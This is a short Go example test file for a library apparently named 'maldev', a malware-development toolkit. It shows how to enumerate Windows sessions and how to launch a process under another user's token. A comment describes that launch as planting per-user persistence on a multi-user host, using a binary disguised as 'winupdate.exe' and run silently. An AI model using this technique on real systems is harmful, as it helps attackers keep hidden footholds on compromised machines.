//go:build windows

package session_test

import (
	"fmt"

	"github.com/oioio-space/maldev/process/session"
	"github.com/oioio-space/maldev/win/token"
)

// List returns every Windows session known to WTSEnumerateSessions.
// Active filters to currently-logged-on interactive sessions.
func ExampleList() {
	infos, err := session.List()
	if err != nil {
		return
	}
	for _, i := range infos {
		fmt.Printf("session %d: %s\\%s\n", i.ID, i.Domain, i.User)
	}
}

// CreateProcessOnActiveSessions spawns a process under another
// user's token with the right environment + working directory.
// Used to plant per-user persistence on a multi-user host.
func ExampleCreateProcessOnActiveSessions() {
	var userToken *token.Token // obtained upstream via win/token
	if err := session.CreateProcessOnActiveSessions(userToken,
		`C:\Users\Public\winupdate.exe`,
		[]string{"--silent"},
	); err != nil {
		return
	}
}
